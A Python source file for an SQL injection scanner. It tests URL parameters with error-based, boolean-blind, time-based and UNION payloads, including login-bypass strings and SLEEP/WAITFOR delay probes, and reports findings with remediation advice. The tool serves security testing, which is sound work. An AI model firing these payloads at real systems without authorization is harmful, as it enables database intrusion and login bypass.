#!/usr/bin/env python3
"""
Advanced SQL Injection Scanner
- Error-based SQLi
- Boolean-based blind SQLi
- Time-based blind SQLi
- UNION-based SQLi
- Second-order SQLi detection
"""

import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode

class SQLiScanner:
    def __init__(self, target_url):
        self.target = target_url
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'SQLiScanner/2.0'})
        
        # Payloads per tipo
        self.payloads = {
            'error_based': [
                "'",
                "1' OR '1'='1",
                "1' AND '1'='2",
                "1' UNION SELECT NULL--",
                "' OR 1=1--",
                "admin' --",
                "' OR 'x'='x",
                "1' AND 1=CONVERT(int, (SELECT @@version))--"
            ],
            'boolean_blind': [
                ("1' AND '1'='1", True),   # Should return data
                ("1' AND '1'='2", False),  # Should NOT return data
            ],
            'time_based': [
                "1' AND SLEEP(5)--",
                "1'; WAITFOR DELAY '00:00:05'--",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))x)--",
                "1' AND pg_sleep(5)--"
            ],
            'union_based': [
                "1' UNION SELECT NULL--",
                "1' UNION SELECT NULL,NULL--",
                "1' UNION SELECT NULL,NULL,NULL--",
                "1' UNION ALL SELECT NULL,NULL,NULL--",
            ]
        }
        
        # Error signatures
        self.error_signatures = [
            'sql syntax',
            'mysql_fetch',
            'mysqli',
            'mysql error',
            'postgresql',
            'pg_query',
            'oracle error',
            'odbc',
            'sqlstate',
            'syntax error',
            'unclosed quotation',
            'quoted string',
            'microsoft ole db',
            'sqlite_',
            'database error'
        ]
    
    def scan_all(self, endpoints):
        """Main SQLi scanning orchestrator"""
        for endpoint in endpoints:
            # Test all SQLi types
            self._test_error_based(endpoint)
            self._test_boolean_blind(endpoint)
            self._test_time_based(endpoint)
            self._test_union_based(endpoint)
        
        return self.vulnerabilities
    
    def _test_error_based(self, url):
        """Test Error-based SQLi"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return
        
        for param_name in params.keys():
            original_value = params[param_name][0]
            
            for payload in self.payloads['error_based']:
                try:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    response = self.session.get(test_url, timeout=10)
                    response_lower = response.text.lower()
                    
                    # Check for SQL errors
                    for signature in self.error_signatures:
                        if signature in response_lower:
                            self.vulnerabilities.append({
                                'tool': 'sqli_scanner',
                                'type': 'Error-based SQL Injection',
                                'name': 'SQL Injection',
                                'severity': 'critical',
                                'url': test_url,
                                'parameter': param_name,
                                'payload': payload,
                                'error_signature': signature,
                                'description': f"Error-based SQLi in '{param_name}' - {signature} error exposed",
                                'evidence': self._extract_error(response.text, signature),
                                'remediation': self._get_remediation('error_based'),
                                'cvss': 9.8
                            })
                            return  # Found SQLi, stop testing this param
                except:
                    pass
    
    def _test_boolean_blind(self, url):
        """Test Boolean-based blind SQLi"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return
        
        for param_name in params.keys():
            try:
                # Get baseline response
                baseline = self.session.get(url, timeout=10)
                baseline_length = len(baseline.text)
                
                # Test TRUE condition
                true_payload, _ = self.payloads['boolean_blind'][0]
                test_params = params.copy()
                test_params[param_name] = [true_payload]
                true_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                true_response = self.session.get(true_url, timeout=10)
                
                # Test FALSE condition
                false_payload, _ = self.payloads['boolean_blind'][1]
                test_params[param_name] = [false_payload]
                false_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                false_response = self.session.get(false_url, timeout=10)
                
                # Compare response lengths
                true_len = len(true_response.text)
                false_len = len(false_response.text)
                
                # If responses differ significantly, likely boolean blind SQLi
                if abs(true_len - false_len) > 100:
                    self.vulnerabilities.append({
                        'tool': 'sqli_scanner',
                        'type': 'Boolean-based Blind SQL Injection',
                        'name': 'SQL Injection (Blind)',
                        'severity': 'critical',
                        'url': url,
                        'parameter': param_name,
                        'true_payload': true_payload,
                        'false_payload': false_payload,
                        'description': f"Boolean-based blind SQLi in '{param_name}' - response differs based on condition",
                        'evidence': f"TRUE response: {true_len} bytes, FALSE response: {false_len} bytes",
                        'remediation': self._get_remediation('blind'),
                        'cvss': 9.1
                    })
                    return
            except:
                pass
    
    def _test_time_based(self, url):
        """Test Time-based blind SQLi"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return
        
        for param_name in params.keys():
            for payload in self.payloads['time_based']:
                try:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    # Measure response time
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=15)
                    elapsed = time.time() - start_time
                    
                    # If response took ~5 seconds, likely time-based SQLi
                    if elapsed >= 4.5 and elapsed <= 6:
                        self.vulnerabilities.append({
                            'tool': 'sqli_scanner',
                            'type': 'Time-based Blind SQL Injection',
                            'name': 'SQL Injection (Time-based)',
                            'severity': 'critical',
                            'url': test_url,
                            'parameter': param_name,
                            'payload': payload,
                            'response_time': f"{elapsed:.2f}s",
                            'description': f"Time-based blind SQLi in '{param_name}' - delay observed",
                            'evidence': f"Expected ~5s delay, observed {elapsed:.2f}s",
                            'remediation': self._get_remediation('time_based'),
                            'cvss': 9.1
                        })
                        return
                except requests.Timeout:
                    # Timeout is also a positive indicator
                    self.vulnerabilities.append({
                        'tool': 'sqli_scanner',
                        'type': 'Time-based Blind SQL Injection',
                        'name': 'SQL Injection (Time-based)',
                        'severity': 'critical',
                        'url': test_url,
                        'parameter': param_name,
                        'payload': payload,
                        'description': f"Time-based SQLi suspected - request timeout",
                        'remediation': self._get_remediation('time_based')
                    })
                    return
                except:
                    pass
    
    def _test_union_based(self, url):
        """Test UNION-based SQLi"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return
        
        for param_name in params.keys():
            for payload in self.payloads['union_based']:
                try:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    response = self.session.get(test_url, timeout=10)
                    
                    # Check for successful UNION (no errors + extra data)
                    if response.status_code == 200 and not any(sig in response.text.lower() for sig in self.error_signatures):
                        # If response is significantly larger, might be UNION SQLi
                        baseline = self.session.get(url, timeout=10)
                        if len(response.text) > len(baseline.text) * 1.2:
                            self.vulnerabilities.append({
                                'tool': 'sqli_scanner',
                                'type': 'UNION-based SQL Injection',
                                'name': 'SQL Injection (UNION)',
                                'severity': 'critical',
                                'url': test_url,
                                'parameter': param_name,
                                'payload': payload,
                                'description': f"UNION-based SQLi in '{param_name}' - successful UNION query",
                                'evidence': f"Response increased by {len(response.text) - len(baseline.text)} bytes",
                                'remediation': self._get_remediation('union'),
                                'cvss': 9.8
                            })
                            return
                except:
                    pass
    
    def _extract_error(self, html, signature):
        """Extract error message"""
        lines = html.split('\n')
        for line in lines:
            if signature in line.lower():
                return line.strip()[:300]
        return signature
    
    def _get_remediation(self, sqli_type):
        """Get remediation advice"""
        remediations = {
            'error_based': 'Use parameterized queries (prepared statements). Never concatenate user input into SQL. Disable verbose error messages in production.',
            'blind': 'Implement parameterized queries. Add input validation. Use ORM frameworks. Limit database user privileges.',
            'time_based': 'Use prepared statements with bound parameters. Implement query timeouts. Monitor for abnormal query execution times.',
            'union': 'Always use prepared statements. Validate and sanitize input. Apply principle of least privilege to database accounts.'
        }
        return remediations.get(sqli_type, 'Use parameterized queries and input validation.')